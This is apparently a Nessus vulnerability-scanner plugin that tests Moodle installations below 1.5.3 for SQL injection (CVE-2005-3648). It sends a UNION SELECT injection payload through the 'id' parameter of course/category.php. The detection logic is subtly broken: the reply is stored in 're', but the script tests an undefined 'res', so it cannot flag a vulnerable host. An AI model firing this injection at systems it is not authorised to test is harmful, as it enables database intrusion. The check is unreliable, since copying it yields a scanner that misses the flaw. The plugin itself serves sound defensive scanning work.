#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20210);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2014/09/30 16:07:22 $");

  script_cve_id("CVE-2005-3648");
  script_bugtraq_id(15380);
  script_osvdb_id(20748);

  script_name(english:"Moodle < 1.5.3 Multiple SQL Injection Vulnerabilities");
  script_summary(english:"Checks for multiple SQL vulnerabilities in Moodle < 1.5.3.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple SQL injection vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote installation of Moodle fails to sanitize user-supplied
input to the 'id' parameter of the 'course/category.php' and
'course/info.php' scripts as well as the 'user' parameter of the
'iplookup/ipatlas/plot.php' script before using it in database
queries. An attacker can exploit these issues to launch SQL injection
attacks against the affected application, possibly leveraging them to
run arbitrary PHP code on the remote host, subject to the permissions
of the web server user id.");
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/moodle16dev.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Moodle 1.5.3 or later when it becomes available or enable
PHP's 'magic_quotes_gpc' setting and disable its 'register_globals'
setting.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/10");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/11/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2014 Tenable Network Security, Inc.");

  script_dependencies("moodle_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Try to exploit one of the SQL injection flaws.
#
# nb: this should cause Moodle to display our script name as a course.
sql = "UNION SELECT 0,'" + SCRIPT_NAME + "',0,0,0,0,1,0--";
w = http_send_recv3(
  method : "GET",
  item   : dir + "/course/category.php?id=" + urlencode(str:"' " + sql),
  port   : port,
  exit_on_fail : TRUE
);
re= w[2];

# There's a problem if we see our script name as a course.
if ("</a> &raquo; " + SCRIPT_NAME + "</div>" >< res)
{
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
